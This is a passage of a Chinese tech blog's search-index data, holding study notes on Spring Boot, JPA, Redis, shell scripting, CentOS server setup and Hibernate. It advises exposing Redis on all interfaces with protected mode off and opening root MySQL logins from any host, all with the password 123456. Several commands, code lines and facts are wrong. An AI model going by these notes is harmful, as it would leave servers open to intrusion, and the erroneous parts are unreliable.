String[]&#123;&quot;com.ishangu.Dog&quot;&#125;; &#125; @Override public Predicate&lt;String&gt; getExclusionFilter() &#123; return null ; &#125;&#125; 12345678910111213@RestController@Import(ConfigSelector.class) // 方式三：引入 ImportSelector 实现类public class HelloController &#123; @Autowired Dog dog ; @RequestMapping(&quot;hellodog&quot;) public String hellodog() &#123; System.out.println(dog); return &quot;hello&quot; ; &#125;&#125; 方式四：导入 ImportBeanDefinitionRegistrar 实现类 编写实现类，==在实现类中注册一个 Bean 对象==； 使用Import导入实现类。 1234567891011public class ConfigDeferredImport implements ImportBeanDefinitionRegistrar &#123; @Override public void registerBeanDefinitions(AnnotationMetadata importingClassMetadata, BeanDefinitionRegistry registry, BeanNameGenerator importBeanNameGenerator) &#123; // 判断 IOC 容器中是否有这个类型的 Bean，如果存在返回 true，否则 false Boolean b = registry.containsBeanDefinition(&quot;com.ishangu.Dog&quot;) ; if(!b) &#123; // 如果没有，就注册一个进去 RootBeanDefinition root = new RootBeanDefinition(Dog.class) ; registry.registerBeanDefinition(&quot;dog&quot;, root); &#125; &#125;&#125; 123456789101112@RestController@Import(ConfigDeferredImport.class) // 方式四public class HelloController &#123; @Autowired Dog dog ; @RequestMapping(&quot;hellodog&quot;) public String hellodog() &#123; System.out.println(dog); return &quot;hello&quot; ; &#125;&#125; 方式五：引入 xml 配置文件中的 Bean（不推荐） 像之前配置 SpringMVC 一样编写 application.xml，然后使用注解导入该配置文件。 @ImportResource(&quot;application.xml&quot;) ; 修改 SpringBoot 默认配置 在我们的 SpringBoot 项目中，一般都存在一个 application.properties或者application.yml配置文件，该文件不可修改其命名，否则会无法加载。 我们可以在这个文件中修改 SpringBoot 提供的默认配置，在 SpringBoot 项目中允许 properties 和 yml 文件同时存在，并且两个文件都会进行加载。 此时，properties属性文件的优先级更高。当我们在两者中同时修改同一项配置，会以.properties为主。 12# application.propertiesserver.port=8888 123# application.ymlserver: port: 9999 在两个配置文件中都配置端口号，最终只有 application.properties 生效。 SpringBoot-JPA介绍 JPA 是 ORM 持久层的规范， JPA 自身只是定义了规范而已，最终需要依靠 ORM 框架来进行实现。 JPA：简称 Java 持久层 API，**==主要通过 Hibernate 来提供实现==**，因为 Hibernate 是全自动的 ORM 框架（Mybatis 只是半自动的 ORM 框架，所以没有实现 JPA 规范）。 配置 注意：当我们引入 JPA 依赖之后，SpringBoot 并不知道我们想要使用的数据库是什么，所以==我们需要手动引入数据库驱动包，并配置数据源相关内容（IP、数据库名、用户名、密码）==。 pom12345678910111213141516171819&lt;!--引入starter管理的 JPA 依赖--&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!--手动引入 mysql JDBC 依赖--&gt;&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.16&lt;/version&gt;&lt;/dependency&gt;&lt;!--手动添加阿里的 druid 数据库连接池（数据源）--&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.22&lt;/version&gt;&lt;/dependency&gt; application.properties12345678910# 由于 SpringBoot 默认使用的是 tomcat 数据源，所以需要修改数据源类型spring.datasource.type=com.alibaba.druid.pool.DruidDataSourcespring.datasource.druid.url=jdbc:mysql://localhost:8080/testspring.datasource.druid.username=adminspring.datasource.druid.password=123456spring.datasource.druid.driver=com.mysql.jdbc.Driver# 显示 sqlspring.jpa.show-sql=true model12345678910111213141516171819202122232425262728293031323334353637383940414243@Entity@Table(name=&quot;student&quot;)public class Student &#123; @Id @GeneratedValue @Column(name = &quot;id&quot;) private Integer id ; @Column(name = &quot;name&quot;) private String name ; public Student() &#123; &#125; public Student(Integer id, String name) &#123; this.id = id; this.name = name; &#125; public Integer getId() &#123; return id; &#125; public void setId(Integer id) &#123; this.id = id; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; @Override public String toString() &#123; return &quot;Student&#123;&quot; + &quot;id=&quot; + id + &quot;, name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; Repository 接口Repository层就是DAO层，Spring-Data-Jpa 给我们提供了很多的 Repository 接口； 1、Repository 接口 只要我们在接口中写方法名称，只要名称规范，JPA 会自动给我们生成 SQL 语句； 提供了@Query注解，让我们可以在注解中写 SQL 语句。 2、**==CrudRepository 接口==** 继承了Repository接口，有其父类所有功能； 自身提供了很多 CRUD 方法。 3、PagingAndSortingRepository 接口 继承了 CrudRepository 接口，有其父类所有功能； 自身提供了分页和排序的功能。 4、==JpaRepository 接口== 继承了PagingAndSortingRepository，有其父类所有功能； 可以对父类接口的返回值进行适配。 5、JpaSpecificationExecutor 接口 与上面几个没有任何继承实现关系，独立的接口； **==主要用来实现多条件查询==**。 接口 方法 Repository findByName、findByNameOrAddress、findByNameLike、findByAgeOrderBySalDesc CrudRepository save、saveAll()、deleteById、delete(T)、deleteAll、findAll()、findById、exitsById PagingAndSortingRepository findAll(Sort sort)、findAll(Pageable pageable) JpaRepository 对父类方法返回值进行了适配，原本返回的迭代器，现在返回 List，findAll() JpaSpecificationExecutor findOne(Specification)、findAll()、findAll(Pageable)、findAll(Sort)、long count() SpringBoot热部署要实现热部署**==实际上分为两步：自动编译、部署。==** 自动编译：就是，更新完代码后自动编译，更新 class 字节码； 部署：就是将字节码进行执行，替换原来的执行项目。 方式 方式一：使用 SpringLoader 进行热部署，但是由于其很久都没更新了，只适用于 SpringBoot1.5 之前的版本。 方式二：**==使用 SpringBoot devTools 进行热部署==（目前使用最多的方式**）。 原理是代码，jar 包实现热部署； Idea 开发工具，或者插件也可以实现热部署。 代码实现 ==引入依赖== 配置依赖选项； 引入 SpringBoot 插件； 123456789101112131415161718&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;scope&gt;true&lt;/scope&gt;&lt;/dependency&gt;&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;fork&gt;true&lt;/fork&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; ==自动编译== Idea 中 File-&gt;Setting，打开编译设置，勾选热部署。 ==部署== 手动部署（==推荐==）：Idea 中直接ctrl+F9 即可； 自动部署 ctrl+shift+alt+/打开设置，选择第一个registry，进去后勾选选项 running 结尾选项。 这样子可能一句代码没敲完就热部署了，不太方便。 Idea设置实现直接用 Idea 的设置也可以实现热部署功能。 IDEA 右上角点击启动类设置，选择开启自动编译和热部署。","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"Redis","date":"2022-03-16T01:40:30.000Z","path":"2022/03/16/2022.03.16 Redis/","text":"RedisNoSQL：是一种非关系型数据库的统称，Redis 就是其中最常用的一种 NoSql 数据库，经常用于关系型数据库的缓存。 NoSQL 数据库（非关系型数据库）与 SQL 数据库（关系型）区别： NoSQL 数据库不遵循 SQL 标准； NoSQL 数据库不支持 ACID（事物的四大特性：原子、一致、隔离、持久）； NoSQL 数据库拥有远超ＳＱＬ 数据库的性能； 应用场景 对数据高并发的读写； 海量数据的读写； 需要高扩展性的数据； 注：当数据量特别大，并且需要频繁进行操作的时候，关系型数据库就有可能承受不住压力崩溃，此时就可以采用非关系型数据库来缓解数据库压力。 不适用场景 需要使用事务的情况下； 我们需要结构化查询的时候（有条件查询）； 常见NoSQL数据库 Redis MongoDB HBase 注：Redis支持非常高速的读写，达到一秒钟可以读取几十万次数据，但是 Redis 只是一个单纯的 key-value 型数据库，跟我们的 map 集合比较类似，只能根据 key 来获取 value，不能实现任何的条件查询操作，所以 redis 永远无法替代我们的关系型数据库，但是由于其高速的读写效率，所以可以用来当做关系型数据库的缓存使用，以及消息队列、分布式事务管理、分布式注册中心。 部署Redis安装 redis 解压安装包：tar -zxf redis-5.0.3.tar.gz 安装 C 语言编译器 g++：yum -y install gcc cd 到 Redis 的解压目录，编译 Redis：make MALLOC=libc、cd src &amp;&amp; make install Redis启动方式前台启动服务 运行src/redis-server，即可启动 Redis 服务，但是此时仅仅打开服务，不能执行 redis 语句； 所以需要后台启动该服务。 后台启动服务 修改解压后文件夹下的配置文件：redis-conf，将其中的daemonize no修改为daemonize yes 再次启动，redis服务，需要指定通过配置文件进行启动（src/redis-server /usr/local/redis-5.0.3/redis.conf）。 ==查看进程的Linux指令==：ps -aux | grep redis ==杀死进程的Linux指令==：kill -9 [进程号]，-9 表示直接杀死进程，除此之外有休眠进行等选项。 远程连接服务 远程连接服务器，服务器需要修改防火墙打开对应端口号（redis 默认端口 6379）。 防火墙设置指令 查看所有打开的端口（firewall-cmd --list-port） 打开某个端口6379，或某组8080-8090（firewall-cmd --zone=public --add-port=6379/tcp --permanent ） 移除（firewall-cmd --zone=public --remove-port=6379/tcp --permanent） 配置完重启防火墙生效（firewall-cmd --reload） 修改配置文件redis-conf 指定可以远程的服务器地址（全0表示所有）：bind 127.0.0.1 修改为 bind 0.0.0.0 protected-mode yes 修改为 protected-mode no 修改密码，添加参数（requirepass 123456） 打开客户端，编写 Redis 指令 执行src/redis-cli -a 123456，也可以指定选项-p 6379 选择启动端口（同时启动了多个 redis 服务时，选择端口进行打开），若无密码可以省略密码，若不指定端口，默认 6379。 解决中文字符串乱码：重新打开客户端，指定选项--raw（src/redis-cli –raw -a 123456 -p 6379） 远程连接Redis服务 windows 下安装Redis Desktop Manager，新建连接即可。 Redis 六中命令（key与五大数据类型）​ Redis 一共有 16（0~15）个数据库，通过select [index] 可以切换到指定数据库。 String​ String 是 redis 中最常用的数据类型，其存储方式是安全的二进制方式存储，字符串最大 value 值为 512M。Strng 类型并不只是单纯的可以存储字符串，也可以存储图片或者文件的序列化对象存储到里面。 ​ String 类似 arraylist 的动态扩容机制，每次扩容都是两倍。 ### 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657581. set [key] [value] 添加键值对，会进行覆盖已有键值对。 setnx [key] [value] 添加键值对（主添加-从无到有），如果键值对已存在，不进行任何操作（同set [key] [value] NX）。 setxx [key] [value] 添加键值对（主修改-从原到变），如果键值对不存在，不进行任何操作（同set [key] [value] XX）。 2. get [key] 获取值。3. APPEND [key] [otherValue] 追加值。4. strlen [key] 返回，value 所占用的字节数（中文3字节，英文1字节）。5. incr [key] 自增，要求 value 必须是数值型。 若不存在，则添加一个键值对，初始值为 1。6. decr [key] 递减，要求 value 必须是数值型。 若不存在，则添加一个键值对，初始值为 -1。7. incrby [key] [n] 自增n，incr 功能类似，可以指定步长 n。8. decrby [key] [n] 递减n，decr 功能类似，可以指定步长 n。9. mset [key1] [value1] [key2] [value2] ... 一次性添加多个键值对。10. mget [key1] [key2] [key3] ... 一次性获取多个值。11. msetnx [key1] [value1] [key2] [value2] ... mset 添加键值对时，如果对已有键值对进行添加，会造成覆盖（默认覆盖）。 msetnx 添加时，如果遇到已存在键值对，会造成添加语句整体失败（原子性，即使同时有未覆盖的添加也不会成功）。12. getrange [key] [begin] [end] 取值（截取），并且只取指定下标范围内的部分（字符串截取，下标 0 开始）。13. setrange [key] [begin] [value] 存值（指定替换），从下标 [begin] 处，替换成 [value] 注意：不是插入，而是替换后面的字符串。14. setex [key] [secends] [value] 存值（过期时间），存储键值对，但是该数据生命周期只有 [secends] 秒。 时间一过，该键值对过期，自动删除。 同 set [key] [value] EX [secends]15. psetex [key] [millis] [value] 存值（过期时间），倒计时单位毫秒。 同 set [key] [value] PX [millims]16. getset [key] [newValue] 获取覆盖，先获取原值，然后见新值覆盖原值。17. exists [key] 是否存在，存在返回 1，否则返回 0。 Redis 也具有原子性，每一条语句执行类似 mysql 的一个事务执行，只要中间有一条数据执行失败，整条语句都不会生效（如 msetnx）。 List（列表）优点：底层是==双向链表==，数据可以重复，对于==两端数据操作效率较高==； 缺点：通过引索==操作中间数据，效率较低==； 代码1234567891011121314151617181920212223242526271. lpush [aryName] [value1] [value2] 头插法2. rpush3. lindex [aryName] [index]4. lpop [aryName]5. rpop 取完，删除6. rpoplpush [ary1] [ary2] 只能右侧取值，不能左侧取值7. lrange [ary] [begin] [end] 指定下标取元素，-1 表示最后一个下标。8. llen [ary] 获取 list 的 length 长度。9. linsert [ary] [before|after] [oldValue] [newValue] 在指定的 [oldValue] 前或后插入 [newValue] 10. lrem [ary] [count] [value] 删除 [count] 个 [value]，返回真正删除的个数（&lt;=[count]）。11. lset [ary] [index] [updateValue] 将下标为 [index] 的元素值改为 [updateValue] Set（集合）类似 Java 中的 Set 集合，元素无序（存储顺序不可控，与添加顺序不一致），没有下标索引，==值不能重复==。 底层同 Java HashSet 底层，本质上是一个链数组，==元素都是 key-values存在（key为集合名，values 就是以 set 形式存储的元素）== 。 代码12345678910111213141516171819202122232425262728291. sadd [setName] [values...] 添加一条数据到集合，如果重复会忽略掉 value。2. smembers [setName] 获取集合中所有的值。3. scard [setName] 获取集合中元素个数。4. srem [setName] [values...] 删除集合中指定的元素。5. spop [setName] [count] 从集合中随机取出 [count] 个值，取出后删除。6. srandmember [setName] [count] 从集合中随机取出 [count] 个值，不会删除。7. smove [set1] [set2] [value] 将 [value] 从 set1 转移到 set28. sunion [set1] [set2] 得到两个集合的所有元素（去掉重复的） 9. sdiff [set1] [set2] 得到集合1中有，但是集合2中没有的元素（前者独有的元素）。10. sismember [setName] [value] 判断集合中是否存在该元素，有返回1，否则返回0 Zset（有序集合）特点：==有序集合，元素不重复，内部元素进行过排序（并不是存储顺序）。== 集合中的每一个成员 member 都有一个分数值 score 作为排序的依据，主要适用场景：比如音乐按照点击次数进行排行。 代码12345678910111213141516171. zadd [zset] [score1] [value1] ... 有序集合的元素都有一个 score 值，用来进行排序。2. zrange [zset] [minIndex] [maxIndex] 返回集合中排行区间段内的元素（按照排行榜去第几~第几）。 3. zrangebyscore [zset] [minScore] [maxScore] 返回集合中分数区间段内的元素（包括临界点，默认升序）4. zrevrangebyscore [zset] [minScore] [maxScore] 返回集合分数区间段内的元素（降序输出）5. zincrby [zset] [x] [value] 将指定元素的分数值增加 x6. zrank [zset] [value] 查询 Redis集群​ 为什么需要集群，单个的主机实例，访问量一般都是有限制的，此时我们可以搭建集群来解决访问量的问题，Redis的集群方案目前主要有三种。 主从复制改模式有两个角色： 主：主机（master）负责写入数据； 从：负责读数据，“从服务器”负责将主服务器上的数据同步拷贝到自身，客户端在读取数据的时候从“从服务器”中读取即可。 注意：由于数据库查询的工作量是最大的，所以一般搭建主从的时候，都是“一主多从”。示例：以三台虚拟机为例，配置“一主两从”集群模式。 部署在从服务器上的 redis-conf 配置文件中，配置主服务器的 ip，端口，以及连接密码即可。 哨兵模式所谓的哨兵模式，就是基于主从复制，只是在主从的基础上引入了哨兵线程，由哨兵来监控以及自身处理故障，哨兵的职责如下： 监控 master、slave 是否正常运行； 如果 master 宕机了，会从 slave 中选取一个自动转为 master 继续对客户端提供写入服务； 可以让多个哨兵监控 redis，同时也可以让哨兵之间也可以互相监督。 注意：当主服务器 ## Cluster 模式","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"shell刷题","date":"2022-03-14T11:47:30.000Z","path":"2022/03/14/2022.03.14 ShellCode/","text":"计算文件行数WC统计文件==字节数、字数、行数==； 选项 -l：行数； -c：字符数，bytes，chars； -m：字符数； -w：字数； -L：最长行的长度。 参数文件名。若不指定，或者指定为-，则==从标准输入设备中获取参数。== ==管道|输入== | 可讲前一条指令的输出，作为下一条指令的输入。 代码 方法1，使用管道作为 wc 参数； 1cat fileName.txt | wc -l 方法2，文件变量，作为参数给 wc，然后使用 awk 取输出的第一个结果。 12file=fileName.txtecho `wc -l $&#123;file&#125; | awk&#x27;&#123;print $1&#125;&#x27;`","link":"","tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.fangning.xyz.com/tags/Linux/"}]},{"title":"CentOs","date":"2022-03-11T01:12:30.000Z","path":"2022/03/11/2022.03.11 CentOS/","text":"Centos目录结构 bin：存放了标准 Linux 工具（命令），例如ls,vl等里面所有命令都包含在 path系统变量之中，如果 ｐａｔｈ 出现问题就会导致找不到对应命令； root：系统管理员目录，一般不建议更改； etc：里面主要存放量系统配置方面的各种文件，例如我们安装了 mysql，当我们想修改 mysql 配置文件的时候就会发现 mysql 的配置文件在 etc 之下； dev：里面主要存放个人数据，例如每个用户的设置文件，以及用户的桌面文件，用户的各种数据，用户目录等； temp：这个是临时目录，主要放一些灵石文件，有些系统会自动清理 temp文件夹，所以里面不能放重要文件； usr：里面主要存放不适合存入到 bin 和 etc 目录下的内容； 安装 tomcat 解压 解压 tomcat 到 usr/local ，然后将项目 .war 放到其中的 wabapps 即可。 启动 执行 bin 目录下的，startup.sh 关闭 执行 bin 目录下的，shutdown.sh 修改配置文件 编辑 conf 目录下的，service.xml文件。 可以修改访问的端口号，同时多个 tomcat 做负载均衡时需要部署多个 tomcat。 安装 mysql 解压 mysql 到 user/local，解压的时候将文件名改为 mysql； 创建用户组，和用户 groupadd mysql useradd -r -g mysql mysql 创建工作区 mkdir -p /data/mysql 授权（对mysql组下的mysql用户授予该文件夹的权限） chown mysql:mysql -R /data/mysql 修改 mysql 的配置文件 vim /etc/my.cnf 123456789101112[mysqld]bind-address=0.0.0.0 # ip 地址port=3306 # 端口user=mysql # 操控用户datadir=/data/mysql # 指定工作区，数据库存放文件夹basedir=/usr/local/mysql # 按照目录socket=/tmp/mysql.sock # 缓存文件夹log-error=/data/mysql/mysql.err # 指定日志文件输出位置pid-file=/data/mysql/mysql.pid # 进程 idcharacter_set_server=utf8mb4 # 指定编码symbolic-links=0explicit_defaults_for_timestamp=true 指定初始化文件 ./mysqld --defaults-file=/etc/my.cnf --basedir=/usr/local/mysql/ --datadir=/data/mysql/ --user=mysql --initialize 查看是否成功（密码？） cat /data/mysql/mysql.err 添加 mysql 服务 cp /usr/local/mysql/support-files/mysql.server /etc/init.d/mysql 启动服务 service mysql start 登陆并修改密码 ./mysql -u root -p回车后粘贴密码。 修改密码 set password = password(&#39;123456&#39;); ALTER USER &#39;root&#39;@&#39;localhost&#39; PASSWORD expire never; flush privileges; use mysql; update user set host=&#39;%&#39; where user=&#39;root&#39;; flush privileges; 本地使用 Navicat 连接测试。 ShellShell 是一种命令语言，主要用于跟 Linux 系统打交道，用来操作 Linux 的各种命令执行等。 Linux 的 Shell 种类非常多 Bourne shell 命令是/usr/bin/sh 或则 /bin/sh Bourn Agaiin Shell（常用） 命令是/bin/base C Shell 命令是/usr/bin/csh K Shell 命令是/usr/bin/ksh Shell for root 命令是/sbin/sh 其中 Bourn Again Shell 是目录大部分 Linux 操作系统使用的默认 Shell 脚本。 hello shell 新建一个.sh 文件（/usr/local/shell/hello.sh） 12#! &#x2F;bin&#x2F;bash # 约定的标记，指定解释器是什么，因为 shell 有多种脚本echo Hello shell 默认创建的 shell 脚本，没有执行权限，需要对其进行授权才能执行 chmod +x ./hello.sh 执行 ./hello.sh shell语法变量Shell 是一门脚本语言，属于弱类型语言，所以 Shell中不需要声明变量类型，直接让变量名＝值即可； 变量名由字母、数字、下划线组成，不能以数字开头； 声明：varName=value； 引用一：$varName_；==需要在变量名后添加空格，隔开后方其他指令==。 引用二：$&#123;varName&#125;；==使用大括号包裹变量名，这样子就可以不用追加空格。== # 在 Shell中是注释； 所有==变量值都被认为是字符串==。 执行 Linux 命令 可以使用==反单引号来包裹需要执行的命令语句==。 常量 变量可以任意修改值； readonly varName=value 使用==readonly==关键字定义只读常量； 删除变量 unset varName；==unset==关键字加变量名，即可删除； 只读常量不能被删除。 作用域 局部变量：只有当前的 .sh 文件中可以使用（以上所有定义的变量）； 环境变量：可以跨脚本，全局使用，所有 .sh 中可以访问 系统变量 用户变量 123456789101112131415161718192021# 变量name=张三age=18echo $&#123;name&#125;今年$&#123;age&#125;岁了！# 执行 Linux 命令（使用反单引号包裹需要执行的命令），赋值给变量files=for file in `ls /etc`show files# 只读常量readonly money=10000money=1000echo $&#123;money&#125;# 删除变量priVar=100readonly constVar=100unset priVarunset constVarecho $&#123;priVar&#125;echo $&#123;constVar&#125; 字符串 单引号 无法输出&#39;单引号； 可以输出&quot;； 无法输出变量； 双引号 可以输出单引号，带转义的双引号，和变量； 无引号 都可以； 转义加单引号，转义加双引号，变量。 函数 $&#123;#strName&#125;：输出字符串长度； $&#123;strName:0:2&#125;：字符串的0位开始，长度2； expr index $&#123;strName&#125; subStr 反单引号包裹执行命令，前串中若包含后串，返回1； 数组shell 中的数组可以不指定长度，每个元素之间使用空格进行分割。 使用下标从数组中取值，下标 0 开始； 使用*表示下标，表示所有； 使用@表示下标，表示所有； &#123;&#125; 大括号中第一个儿添加 # 号，获取长度。 12array=(张三 李四 王五)echo $&#123;array[0]&#125; 控制台输入执行 sh 脚本的时候，如果传入了参数，在脚本中直接使用$&#123;index&#125;下标，==脚本参数数组没有变量名==。 ${}：大括号内写#表示参数个数； ${*}、${@}：所有参数； $$：当前执行脚本的进程ID； $!：后台运行最后一个进程； $?：当前脚本执行状态：0正常，1错误。 运算算数运算 反单引号包裹表达式，运算符前后空格间隔。 ` expr 5 + 8 ` ` expr 2 \\* 3 `：乘号有特殊含义，需要进行转义； ` expr 8 / 5 ` ` expr 5 % 8 ` let &quot;2+3&quot; be 条件分支if123456789if ((a&gt;b)) &amp;&amp; ((a&lt;=100))then echo $&#123;a&#125;elif [[a -le b]] || [[a -lt 0]]then echo &quot;a小于等于b或小于0&quot;else echo &quot;其他&quot;fi 1if ((a&lt;b));then echo &#x27;a小于b&#x27;;fi case123456789# 控制台输入+case语句echo 请输入一个数字:read numcase $&#123;num&#125; in 1) echo 输入了1;;# 两个分好结尾 2) echo 输入了2;;# 半边括号写匹配值 3) echo 输入了3;; *) echo 输入了其他;;# *号匹配所有情况esac # 逆序命令结尾 关系运算中括号风格 条件写到[] 中，并且前后要有空格留白。 -gt、-lt：大于、小于； -ge、-le、-eq、-ue：大于等于、小于等于、等于、不等于； -a、-o：&amp;&amp; 逻辑与、|| 逻辑或； 123456789101112131415# 赋值操作,切忌赋值时=号前后无空格，有空格的就是字符串的相等判断了b=4a=3 c=5# 下面就是逻辑判断语句了if [ $a -gt $b ]then # 注意这里要有个then echo &#x27;a 大于 b&#x27;elif [ $a -gt $c ] # 注意shell中的elseif要缩写成elifthen # 注意这里还必须要有then echo &#x27;a 大于 c&#x27;else # 注意这时就不需要then了 echo &#x27;a即不大于b也不大于c&#x27;fi 双重小括号风格 条件写到(())中； 条件内部直接写运算符号（&gt;、&lt;、!=）； 逻辑运算直接写； 123456789if (($&#123;a&#125;&gt;$&#123;b&#125;))then echo &#x27;a 大于 b&#x27;elif (($&#123;a&#125; &gt; $&#123;c&#125;))then echo &#x27;a 大于 c&#x27;else echo &#x27;a既不大于b，也不大于c&#x27;fi where123456i=0where (i&lt;100)do echo $&#123;i&#125; let &quot;i++&quot;done for1234567891011for i in &#123;1..10&#125;do echo $&#123;i&#125;doneecho ---------------------------------for i in [1 2 3 4]do echo $&#123;i&#125;done","link":"","tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.fangning.xyz.com/tags/Linux/"}]},{"title":"hibernate","date":"2022-03-01T06:05:30.000Z","path":"2022/03/01/2022.03.01 Hibernate/","text":"HibernateHibernate 是一个开发源代码的对象关系框架（ORM）。它对 JDBC 进行了非常轻量级的对象封装，他将==POJO（简单 java 对象，简单 java 类）==与数据库表建立映射关系，是一个全自动的 orm 框架。 可以自动生成 SQL 语句，自动执行； 使用面向对象思维来操纵数据库； 可在 java 客户端使用，也可在 servlet/jsp web 应用中使用。 ==MyBatis 对数据库的任何操作，都需要写对应的 SQL 和接口，然而，如果是 Hibernate 只需要对映射数据库表的对象进行代码操作，然后提交到数据库，保持一致（该过程同 GIT 的提交操作，将缓存同步到本地库）==； 完成数据持久化操作，类似 MyBatis。 对比Mybatis 相对于 MyBatis 的 SQL-Mapping 的 ORM 实现，Hibernate 的 ORM 实现更加完善，**==提供了对象状态管理==**，级联操作等功能； ==完全面向对象，语句与数据库无关，开发者无序关注 SQL 的实现==，简单，可移植性好； 缺点：自由度较低，MyBatis 可以自定义 SQL，可实现复杂操作。 体系结构​ Hibernate 有许多用于对象持久的对象：==连接工厂、会话工厂、事物工厂、会话、事物==。 架构层次 ​ Hibernate框架使用许多对象会话工厂，会话，事务等以及现有的Java API，如JDBC(Java数据库连接)，JTA(Java事务API)和JNDI(Java命名目录接口)。 元素 ==SessionFactory== SessionFactory是ConnectionProvider的会话和客户端工厂。拥有数据的二级缓存（可选）。org.hibernate.SessionFactory接口提供了工厂方法来获取Session的对象。 会话(Session) Session对象提供应用程序和存储在数据库中的数据之间的接口。 它是一个短生命周期的对象并包装JDBC连接。 它是事务，查询和标准的工厂。 它拥有一级缓存(强制性)数据。 org.hibernate.Session接口提供插入，更新和删除对象的方法。 它还提供了事务，查询和标准的工厂方法。 事务(Transaction) 事务对象指定工作的原子单位,它是一个可选项。 org.hibernate.Transaction接口提供事务管理的方法。 连接提供者(ConnectionProvider) 它是一个JDBC连接工厂。 它从DriverManager或DataSource抽象出来的应用程序。 事务工厂(TransactionFactory) 它是一个可选项它是一个事务工厂，是一个可选项。 搭建1、导入相关依赖； 2、创建 Hibernate 配置文件； 3、创建实体类； 4、创建实体类-关系映射文件； 5、调用 Hibernate API 完成操作； 配置依赖创建 maven 工程，配置 pom.xml； 123456789101112131415161718192021222324252627282930313233343536373839&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.hibernate&lt;/groupId&gt; &lt;artifactId&gt;hibernate-core&lt;/artifactId&gt; &lt;version&gt;5.4.1.Final&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.hibernate&lt;/groupId&gt; &lt;artifactId&gt;hibernate-entitymanager&lt;/artifactId&gt; &lt;version&gt;5.4.1.Final&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.hibernate&lt;/groupId&gt; &lt;artifactId&gt;hibernate-validator&lt;/artifactId&gt; &lt;version&gt;6.0.13.Final&lt;/version&gt; &lt;/dependency&gt; &lt;!--操作数据库，需要 jdbc 驱动！--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.16&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.11&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;version&gt;1.18.10&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; Hibernate==配置文件==命名必须为hibernate.cfg.xml SessionFactory：针对单个数据库映射经过编译的内存镜像文件，将数据库转化为一个 java 可以识别的镜像文件； 构造 SessionFactory 非常耗费资源，所以通常只需要配置一个 SessionFactory。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;&lt;!DOCTYPE hibernate-configuration PUBLIC &quot;-//Hibernate/Hibernate Configuration DTD 3.0//EN&quot; &quot;http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd&quot;&gt;&lt;hibernate-configuration&gt; &lt;!--核心配置：session-factory--&gt; &lt;session-factory&gt; &lt;!--数据源配置--&gt; &lt;!--数据库URL --&gt; &lt;property name=&quot;connection.url&quot;&gt; jdbc:mysql://localhost:3306/hiber?useUnicode=true&amp;amp;characterEncoding=UTF-8 &lt;/property&gt; &lt;!--数据库用户 --&gt; &lt;property name=&quot;connection.username&quot;&gt;admin&lt;/property&gt; &lt;!--数据库用户密码 --&gt; &lt;property name=&quot;connection.password&quot;&gt;123456&lt;/property&gt; &lt;!--数据库JDBC驱动 --&gt; &lt;property name=&quot;connection.driver_class&quot;&gt; com.mysql.jdbc.Driver &lt;/property&gt; &lt;!--数据库连接池--&gt; &lt;!--添加递增数量--&gt; &lt;property name=&quot;hibernate.c3po.acquire_increment&quot;&gt;5&lt;/property&gt; &lt;!--空闲多长时间释放资源(s)--&gt; &lt;property name=&quot;hibernate.c3p0.idle_test_period&quot;&gt;100&lt;/property&gt; &lt;!--超时时间--&gt; &lt;property name=&quot;hibernate.c3p0.timeout&quot;&gt;1000&lt;/property&gt; &lt;property name=&quot;hibernate.c3p0.max_size&quot;&gt;30&lt;/property&gt; &lt;property name=&quot;hibernate.c3p0.min_size&quot;&gt;5&lt;/property&gt; &lt;property name=&quot;hibernate.c3p0.max_statements&quot;&gt;10&lt;/property&gt; &lt;!--基本信息配置--&gt; &lt;!--Hibernate的方言SQL语句，如果不清楚版本可以直接设置 MySQLDialect--&gt; &lt;property name=&quot;dialect&quot;&gt;org.hibernate.dialect.MySQL8Dialect&lt;/property&gt; &lt;!-- 显示 sql 语句 --&gt; &lt;property name=&quot;show_sql&quot;&gt;true&lt;/property&gt; &lt;!-- 格式化输出 sql 语句 --&gt; &lt;property name=&quot;format_sql&quot;&gt;true&lt;/property&gt; 